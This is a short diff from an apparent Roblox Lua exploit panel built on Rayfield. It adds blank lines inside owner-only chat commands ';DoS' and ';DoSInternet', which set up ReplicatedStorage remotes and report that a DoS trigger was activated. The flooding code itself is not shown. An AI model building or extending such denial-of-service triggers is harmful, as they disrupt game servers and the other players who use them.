@@ -425,6 +425,7 @@ local function OuvirChat(Jogador, Mensagem)
     -- 2. Comandos restritos estritamente ao seu ID de Dono
     if Jogador.UserId == ID_DONO then
         if Mensagem == ";DoS" then
+            
             local player = game:GetService("Players").LocalPlayer
             if not player then return end
             local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -492,6 +493,7 @@ local function OuvirChat(Jogador, Mensagem)
             Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado com sucesso.", Duration = 4 })
             
         elseif Mensagem == ";DoSInternet" then
+            
             local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
             local backpack = LocalPlayer:WaitForChild("Backpack") 
             local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
